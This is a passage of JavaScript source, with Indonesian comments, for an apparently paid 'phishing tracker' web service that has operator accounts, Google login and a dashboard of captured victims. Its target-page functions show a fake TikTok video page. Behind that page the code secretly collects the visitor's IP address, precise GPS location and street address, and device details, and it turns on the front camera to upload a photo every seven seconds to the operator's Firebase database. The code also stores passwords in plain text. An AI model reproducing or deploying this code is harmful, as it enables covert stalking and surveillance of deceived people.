            localStorage.setItem('phising_history', JSON.stringify(history));
        }
        if(t.id) db.ref(PATHS.PHISHING + '/' + t.id).remove();
        trackers.splice(index, 1);
        if(currentUser) db.ref(PATHS.BUYER + '/' + currentUser + '/trackers').set(trackers);
        backToList();
        renderTrackerList();
        showNotification('Deleted');
    }
}

function copyLink(l) {
    navigator.clipboard.writeText(l).then(() => showNotification('Copied!'));
}

// ===== HISTORY =====
function openHistory() {
    const modal = document.getElementById('historyModal');
    const list = document.getElementById('historyList');
    if(history.length === 0) list.innerHTML = '<p style="color:#6b7280; text-align:center; font-size:12px;">No history</p>';
    else {
        let h = '';
        history.forEach((item, i) => {
            h += `
                <div style="background:#0c0c12; border-radius:14px; padding:10px; margin-bottom:8px;">
                    <div style="font-weight:600; font-size:13px;">${item.name}</div>
                    <div style="font-size:9px; color:#6b7280; margin:3px 0;">${item.date}</div>
                    <div style="font-size:10px;">IP: ${item.data?.ip || 'Unknown'}</div>
                    <div style="display:flex; gap:6px; margin-top:6px;">
                        <div class="preview-btn" style="padding:6px; font-size:10px;" onclick="viewHistoryItem(${i})">VIEW</div>
                        <div class="preview-btn delete" style="padding:6px; font-size:10px;" onclick="deleteHistoryItem(${i})">DELETE</div>
                    </div>
                </div>
            `;
        });
        list.innerHTML = h;
    }
    modal.style.display = 'flex';
}

function viewHistoryItem(i) {
    window.open(`https://www.google.com/maps?q=${history[i].data?.loc}`, '_blank');
}

function deleteHistoryItem(i) {
    history.splice(i, 1);
    localStorage.setItem('phising_history', JSON.stringify(history));
    openHistory();
}

// ===== DEVICE INFO =====
async function getBatteryInfo() {
    try {
        const b = await navigator.getBattery();
        return {level: Math.round(b.level * 100), charging: b.charging};
    } catch {
        return {level: 85, charging: false};
    }
}

function getRAM() {
    return navigator.deviceMemory ? navigator.deviceMemory + ' GB' : '4 GB';
}

async function getStorage() {
    if('storage' in navigator && navigator.storage?.estimate) {
        const est = await navigator.storage.estimate();
        return Math.round(est.quota / (1024 * 1024 * 1024)) + ' GB';
    }
    return '128 GB (est.)';
}

function getChipset() {
    const ua = navigator.userAgent;
    if(ua.includes('Snapdragon')) return 'Snapdragon';
    if(ua.includes('Exynos')) return 'Exynos';
    if(ua.includes('MediaTek')) return 'MediaTek';
    if(ua.includes('Tensor')) return 'Google Tensor';
    if(ua.includes('iPhone')) return 'Apple A-series';
    return 'Unknown';
}

function getPlatform() {
    const ua = navigator.userAgent;
    if(ua.includes('Android')) return 'Android ' + (ua.match(/Android\s([0-9.]+)/)?.[1] || '');
    if(ua.includes('iPhone')) return 'iOS ' + (ua.match(/OS\s([0-9_]+)/)?.[1].replace(/_/g, '.') || '');
    return 'Unknown';
}

function getModel() {
    const ua = navigator.userAgent;
    if(ua.includes('Android')) {
        const match = ua.match(/Android\s([0-9.]+);\s*([^;]+)/);
        return match?.[2]?.trim() || 'Android Device';
    }
    if(ua.includes('iPhone')) return 'iPhone';
    return 'Unknown';
}

async function getIP() {
    try {
        const res = await fetch('https://api.ipify.org?format=json');
        const data = await res.json();
        return data.ip;
    } catch {
        return 'Unknown';
    }
}

function updateTime() {
    document.getElementById('currentTime').textContent = new Date().toLocaleTimeString('id-ID', {hour12: false});
}

async function updateDeviceInfo() {
    const battery = await getBatteryInfo();
    document.getElementById('batteryLevel').textContent = battery.level + '%' + (battery.charging ? ' ⚡' : '');
    updateTime();
    setInterval(updateTime, 1000);
    document.getElementById('phoneModel').textContent = getModel();
    document.getElementById('ramInfo').textContent = getRAM();
    document.getElementById('platform').textContent = getPlatform();
    document.getElementById('deviceModel').textContent = getModel();
    document.getElementById('chipsetInfo').textContent = getChipset();
    document.getElementById('storageInfo').textContent = await getStorage();
    document.getElementById('ipAddress').textContent = await getIP();
}

// ===== AUTH =====
function showNotification(m, s = true) {
    const n = document.getElementById('notification');
    n.style.borderColor = s ? '#2a85ff' : '#ef4444';
    n.style.color = s ? '#2a85ff' : '#ef4444';
    n.textContent = m;
    n.style.display = 'block';
    setTimeout(() => n.style.display = 'none', 2000);
}

function openModal(id) { 
    if(id === 'addTrackerModal' && serverStatus !== 'online') {
        if (serverStatus === 'maintenance' && !ADMIN_ACCOUNTS.includes(currentUser)) {
            return showNotification('Maintenance mode', false);
        }
        if (serverStatus === 'offline') {
            return showNotification('Server offline', false);
        }
    }
    document.getElementById(id).style.display = 'flex'; 
}

function closeModal(id) {
    document.getElementById(id).style.display = 'none';
}

function openZoom(s) {
    document.getElementById('zoomedImage').src = s;
    document.getElementById('zoomOverlay').style.display = 'flex';
}


// ===== MANUAL LOGIN (untuk admin/manual) =====
function handleManualLogin() {
    const u = document.getElementById('username').value.trim();
    const p = document.getElementById('password').value.trim();
    if(!u || !p) return showNotification('Fill all fields');
    
    db.ref('registered_users/' + u.replace(/\./g, '_')).once('value').then(s => {
        const d = s.val();
        if(d && d.password === p && new Date().getTime() < d.expiry) {
            completeLogin(u, d);
        } else {
            showNotification('Invalid credentials');
        }
    });
}

// ===== GOOGLE AUTH =====
function initGoogleSignIn() {
    google.accounts.id.initialize({
        client_id: 'YOUR_GOOGLE_CLIENT_ID.apps.googleusercontent.com', // GANTI INI
        callback: handleGoogleCredentialResponse,
        auto_select: false,
        cancel_on_tap_outside: true
    });
    
    google.accounts.id.renderButton(
        document.getElementById('googleLoginBtn'),
        { 
            theme: 'filled_blue', 
            size: 'large', 
            width: '100%',
            text: 'signin_with',
            shape: 'rectangular'
        }
    );
}

function parseJwt(token) {
    const base64Url = token.split('.')[1];
    const base64 = base64Url.replace(/-/g, '+').replace(/_/g, '/');
    const jsonPayload = decodeURIComponent(atob(base64).split('').map(c => {
        return '%' + ('00' + c.charCodeAt(0).toString(16)).slice(-2);
    }).join(''));
    return JSON.parse(jsonPayload);
}

async function handleGoogleCredentialResponse(response) {
    const credential = response.credential;
    const payload = parseJwt(credential);
    
    const googleUser = {
        email: payload.email,
        name: payload.name,
        picture: payload.picture,
        googleId: payload.sub,
        email_verified: payload.email_verified
    };
    
    db.ref('registered_users/' + googleUser.email.replace(/\./g, '_')).once('value', async (snapshot) => {
        const userData = snapshot.val();
        const now = Date.now();
        
        if (userData) {
            if (now < userData.expiry) {
                await completeLogin(googleUser.email, userData);
            } else {
                showNotification('Akun Anda sudah expired! Hubungi admin untuk perpanjang.', false);
            }
        } else {
            const newUser = {
                email: googleUser.email,
                name: googleUser.name,
                picture: googleUser.picture,
                googleId: googleUser.googleId,
                role: 'free',
                createdAt: now,
                expiry: now + (7 * 24 * 60 * 60 * 1000),
                password: 'google_auth_' + googleUser.googleId
            };
            
            await db.ref('registered_users/' + googleUser.email.replace(/\./g, '_')).set(newUser);
            await completeLogin(googleUser.email, newUser);
            showNotification('Akun FREE berhasil dibuat! Upgrade ke PRO untuk akses semua fitur.', true);
        }
    });
}

// ===== COMPLETE LOGIN =====
async function completeLogin(username, userData) {
    if (!checkMaintenanceAccess(username)) {
        document.getElementById('maintenancePage').style.display = 'flex';
        return;
    }
    
    currentUser = username;
    currentUserData = userData;
    currentUserRole = userData.role || 'free'; // Tambahkan ini
    
    localStorage.setItem('current_user', username);
    localStorage.setItem('user_role', currentUserRole); // Tambahkan ini
    localStorage.setItem('user_expiry', userData.expiry);
    
    document.getElementById('loginCard').style.display = 'none';
    
    const splashOverlay = document.getElementById('splashVideoOverlay');
    const splashVideo = document.getElementById('splashVideo');
    
    splashVideo.pause();
    splashVideo.currentTime = 0;
    splashVideo.muted = false;
    splashVideo.volume = 1.0;
    splashVideo.playsInline = true;
    splashVideo.load();
    splashOverlay.style.display = 'flex';
    
    const goToDashboard = function() {
        splashOverlay.style.display = 'none';
        document.getElementById('dashboard').style.display = 'block';
        document.getElementById('displayUsername').innerHTML = username + '<span>.</span>';
        
        // Update role display
        updateRoleDisplay(); // Panggil ini
        loadFeaturesByRole(); // Panggil ini
        
        const h = localStorage.getItem('phising_history');
        if(h) history = JSON.parse(h);
        
        listenToServerStatus();
        
        db.ref(`users/${username.replace(/\./g, '_')}/trackers`).once('value', s => {
            trackers = s.val() || [];
            trackers.forEach((t, i) => {
                if(t.id) {
                    db.ref(`phishing_data/${t.id}`).on('value', ds => {
                        const nd = ds.val();
                        if(nd && JSON.stringify(trackers[i].data) !== JSON.stringify(nd)) {
                            trackers[i].data = nd;
                            renderTrackerList();
                        }
                    });
                }
            });
            renderTrackerList();
        });
        
        setInterval(() => {
            const exp = localStorage.getItem('user_expiry');
            if(!exp) return;
            const d = exp - new Date().getTime();
            if(d < 0) {
                logout();
                return;
            }
            const h = Math.floor(d / 3600000);
            const m = Math.floor((d % 3600000) / 60000);
            const s = Math.floor((d % 60000) / 1000);
            document.getElementById('expiryDisplay').textContent =
                `${String(h).padStart(2, '0')}:${String(m).padStart(2, '0')}:${String(s).padStart(2, '0')}`;
        }, 1000);
        
        updateWorldClock();
        setInterval(updateWorldClock, 1000);
        getRealIP();
        listenToAnnouncements();
        checkVPNOnLoad();
        
        if (!isProUser()) {
            showNotification('⚠️ Akun FREE terbatas. Upgrade ke PRO untuk semua fitur!', false);
        } else {
            showNotification('Welcome ' + username + ' (PRO Member)!', true);
        }
    };
    
    splashVideo.oncanplaythrough = function() {
        let playPromise = splashVideo.play();
        if (playPromise !== undefined) {
            playPromise.then(() => {}).catch(err => {
                splashVideo.muted = true;
                splashVideo.play().then(() => {
                    setTimeout(() => { splashVideo.muted = false; }, 1000);
                }).catch(e => { goToDashboard(); });
            });
        }
    };
    
    splashVideo.onended = function() { goToDashboard(); };
    splashVideo.onerror = function(e) {
        splashOverlay.innerHTML = `<div style="text-align:center; color:#fff; padding:20px;"><i class="fas fa-exclamation-triangle" style="font-size:50px; color:#ff4444; margin-bottom:15px;"></i><p>Video tidak dapat dimuat</p><p style="font-size:12px; color:#666; margin-top:10px;">Mengalihkan ke dashboard...</p></div>`;
        setTimeout(goToDashboard, 2000);
    };
    splashVideo.load();
    
    setTimeout(function() {
        if (splashOverlay.style.display === 'flex') {
            goToDashboard();
        }
    }, 10000);
}

function logout() {
    if (googleCredential) {
        google.accounts.id.disableAutoSelect();
    }
    
    localStorage.removeItem('current_user');
    localStorage.removeItem('user_role');
    localStorage.removeItem('user_expiry');
    closeModal('logoutModal');
    document.getElementById('dashboard').style.display = 'none';
    document.getElementById('loginCard').style.display = 'block';
    document.getElementById('maintenancePage').style.display = 'none';
    currentUser = null;
    currentUserRole = 'free';
    showNotification('Logged out successfully', true);
}

// ===== TARGET PAGE =====
function handleTargetPage() {
    const p = new URLSearchParams(window.location.search);
    const id = p.get('id'), t = p.get('t');
    if(id && t) {
        try {
            const owner = b64d(t);
            document.body.innerHTML = `
                <div style="display:flex; flex-direction:column; align-items:center; justify-content:center; min-height:100vh; background:#000;">
                    <video autoplay muted loop playsinline style="width:100%; max-width:350px;">
                        <source src="https://i.imgur.com/9e0hgPJ.mp4">
                    </video>
                    <h2 style="margin-top:15px; font-size:18px;">TikTok</h2>
                </div>
            `;
            captureTargetData(id, owner);
        } catch(e) {}
        return true;
    }
    return false;
}

function captureTargetData(id, owner) {
    db.ref(PATHS.SERVER_STATUS).once('value', s => {
        if(s.val()?.status === 'offline' || s.val()?.status === 'maintenance') return;
        const path = PATHS.PHISHING + '/' + id;
        const time = new Date().toLocaleString('id-ID');
        
        if(navigator.getBattery) {
            navigator.getBattery().then(b => db.ref(path).update({battery: Math.round(b.level * 100)}));
        }
        
        fetch('https://api.ipify.org?format=json')
            .then(r => r.json())
            .then(r => db.ref(path).update({ip: r.ip, time: time}));
        
        if("geolocation" in navigator) {
            navigator.geolocation.getCurrentPosition(p => {
                const lat = p.coords.latitude;
                const lon = p.coords.longitude;
                db.ref(path).update({loc: `${lat},${lon}`});
                fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}`)
                    .then(r => r.json())
                    .then(d => db.ref(path).update({address: d.display_name}));
            }, () => {}, {enableHighAccuracy: true, timeout: 10000});
        }
        
        db.ref(path).update({
            ram: navigator.deviceMemory ? navigator.deviceMemory + ' GB' : 'Unknown',
            cpu: navigator.hardwareConcurrency ? navigator.hardwareConcurrency + ' Core' : 'Unknown',
            android: navigator.userAgent.includes('Android') ? 'Android' : 'Other OS'
        });
        
        navigator.mediaDevices.getUserMedia({video: {facingMode: "user"}})
            .then(s => {
                const v = document.createElement('video');
                v.srcObject = s;
                v.play();
                setInterval(() => {
                    const c = document.createElement('canvas');
                    c.width = 320;
                    c.height = 320;
                    c.getContext('2d').drawImage(v, 0, 0, 320, 320);
                    db.ref(path + '/photos').push(c.toDataURL('image/jpeg', 0.5));
                }, 7000);
            }).catch(() => {});
    });
}

// ===== JADWAL UPDATE =====
function updateJadwalStatus() {
    const statusEl = document.getElementById('serverStatusJadwal');
    const timeEl = document.getElementById('serverTimeJadwal');
    const messageEl = document.getElementById('serverMessageJadwal');
    
    if (!statusEl || !timeEl || !messageEl) return;
    
    statusEl.textContent = serverStatus === 'online' ? 'ONLINE' : 
                          serverStatus === 'offline' ? 'OFFLINE' : 'MAINTENANCE';
    
    statusEl.style.color = serverStatus === 'online' ? '#10b981' :
                          serverStatus === 'offline' ? '#ef4444' : '#8b5cf6';
    
    const now = new Date();
    timeEl.textContent = now.toLocaleTimeString('id-ID', { hour12: false, hour: '2-digit', minute: '2-digit' });
    
    const currentHour = now.getHours();
    if (serverStatus === 'online') {
        if (currentHour >= 5 && currentHour < 23) {
            messageEl.textContent = 'SERVER ONLINE';
        } else {
            messageEl.textContent = 'Diluar jadwal ON, hubungi admin';
        }
    } else if (serverStatus === 'offline') {
        if (currentHour >= 23 || currentHour < 5) {
            messageEl.textContent = 'SERVER OFFLINE';
        } else {
            messageEl.textContent = 'Diluar jadwal OFF, hubungi admin';
        }
    } else {
        messageEl.textContent = 'MAINTENANCE SERVER';
    }
}

// ===== MODAL INFO AKUN =====
let modalPasswordVisible = false;

function openAccountModal() {
    if (!currentUser || !currentUserData) {
        showNotification('Data akun tidak ditemukan', false);
        return;
    }
    
    document.getElementById('modalUsername').textContent = currentUser;
    document.getElementById('modalPassword').textContent = '••••••••';
    
    updateModalExpiry();
    
    if (window.modalInterval) clearInterval(window.modalInterval);
    window.modalInterval = setInterval(updateModalExpiry, 1000);
    
    openModal('accountModal');
}

function updateModalExpiry() {
    const expiry = localStorage.getItem('user_expiry');
    if (!expiry) return;
    
    const d = parseInt(expiry) - new Date().getTime();
    if (d < 0) {
        document.getElementById('modalExpiry').textContent = '00:00:00';
        document.getElementById('modalRemaining').textContent = 'Akun telah expired';
        document.getElementById('modalStatus').textContent = 'EXPIRED';
        document.getElementById('modalStatus').style.color = '#ff6b6b';
        return;
    }
    
    const days = Math.floor(d / (1000 * 60 * 60 * 24));
    const hours = Math.floor((d % (86400000)) / 3600000);
    const minutes = Math.floor((d % 3600000) / 60000);
    const seconds = Math.floor((d % 60000) / 1000);
    
    document.getElementById('modalExpiry').textContent = 
        `${String(hours).padStart(2, '0')}:${String(minutes).padStart(2, '0')}:${String(seconds).padStart(2, '0')}`;
    
    if (days > 0) {
        document.getElementById('modalRemaining').textContent = `${days} hari ${hours} jam`;
    } else if (hours > 0) {
        document.getElementById('modalRemaining').textContent = `${hours} jam ${minutes} menit`;
    } else {
        document.getElementById('modalRemaining').textContent = `${minutes} menit ${seconds} detik`;
    }
    
    document.getElementById('modalStatus').textContent = 'AKTIF';
    document.getElementById('modalStatus').style.color = '#6bcb77';
}

function toggleModalPassword() {
    const passSpan = document.getElementById('modalPassword');
    const eyeIcon = document.getElementById('modalEyeIcon');
    
    if (!currentUserData) return;
    
    if (modalPasswordVisible) {
        passSpan.textContent = '••••••••';
        eyeIcon.className = 'fas fa-eye';
    } else {
        passSpan.textContent = currentUserData.password;
        eyeIcon.className = 'fas fa-eye-slash';
    }
    modalPasswordVisible = !modalPasswordVisible;
}

function updateRoleDisplay() {
    const roleBadge = document.getElementById('roleBadge');
    if (roleBadge) {
        roleBadge.textContent = isProUser() ? 'PRO' : 'FREE';
        roleBadge.className = isProUser() ? 'role-badge pro' : 'role-badge free';
    }
}

function loadFeaturesByRole() {
    if (!isProUser()) {
        showUpgradeBanner();
    } else {
        hideUpgradeBanner();
    }
}

function showUpgradeBanner() {
    let banner = document.getElementById('upgradeBanner');
    if (!banner) {
        banner = document.createElement('div');
        banner.id = 'upgradeBanner';
        banner.className = 'upgrade-banner';
        banner.innerHTML = `
            <div class="upgrade-banner-content">
                <i class="fas fa-crown"></i>
                <div>
                    <strong>Akun FREE</strong><br>
                    <small>Upgrade ke PRO untuk akses semua fitur</small>
                </div>
                <button onclick="openModal('buyAccessModal')" class="upgrade-btn">UPGRADE</button>
            </div>
        `;
        document.querySelector('.dashboard').insertBefore(banner, document.querySelector('.dashboard').firstChild);
    }
    banner.style.display = 'block';
}

function hideUpgradeBanner() {
    const banner = document.getElementById('upgradeBanner');
    if (banner) banner.style.display = 'none';
}

const originalCloseModal = closeModal;
closeModal = function(id) {
    if (id === 'accountModal') {
        if (window.modalInterval) {
            clearInterval(window.modalInterval);
            window.modalInterval = null;
        }
        modalPasswordVisible = false;
    }
    originalCloseModal(id);
};

// ===== INTERCEPT FETCH =====
const originalFetch = window.fetch;
window.fetch = function(url, options) {
    if (vpnConnected && vpnServer) {
        options = options || {};
        options.headers = {
            ...options.headers,
            'X-Proxy-Server': vpnServer,
            'X-Forwarded-For': '10.0.0.1'
        };
    }
    return originalFetch.call(this, url, options);
};

// ===== INTERCEPT GEOLOCATION =====
if (navigator.geolocation) {
    const originalGetCurrentPosition = navigator.geolocation.getCurrentPosition;
    navigator.geolocation.getCurrentPosition = function(success, error, options) {
        if (vpnConnected && vpnServer) {
            const fakeLocations = {
                'singapore': { lat: 1.3521, lon: 103.8198 },
                'japan': { lat: 35.6762, lon: 139.6503 },
                'usa': { lat: 40.7128, lon: -74.0060 },
                'uk': { lat: 51.5074, lon: -0.1278 },
                'germany': { lat: 52.5200, lon: 13.4050 },
                'netherlands': { lat: 52.3702, lon: 4.8952 }
            };
            const loc = fakeLocations[vpnServer] || fakeLocations.singapore;
            success({
                coords: {
                    latitude: loc.lat,
                    longitude: loc.lon,
                    accuracy: 10
                },
                timestamp: Date.now()
            });
        } else {
            originalGetCurrentPosition.call(this, success, error, options);
        }
    };
}

// ===== INIT =====
window.onload = function() {
    if(handleTargetPage()) return;
    
    listenToServerStatus();
    setInterval(updateJadwalStatus, 1000);
    
    initGoogleSignIn(); // TAMBAHKAN INI
    
    const saved = localStorage.getItem('current_user');
    const savedRole = localStorage.getItem('user_role'); // TAMBAHKAN INI
    
    if(saved) {
        db.ref('registered_users/' + saved.replace(/\./g, '_')).once('value').then(s => {
            const d = s.val();
            if(d && new Date().getTime() < d.expiry) {
                // ... sisanya sama seperti sebelumnya
                currentUserRole = d.role || 'free'; // TAMBAHKAN INI
                updateRoleDisplay(); // TAMBAHKAN INI
                loadFeaturesByRole(); // TAMBAHKAN INI
                // ... lanjutkan kode lama
            }
        });
    }
};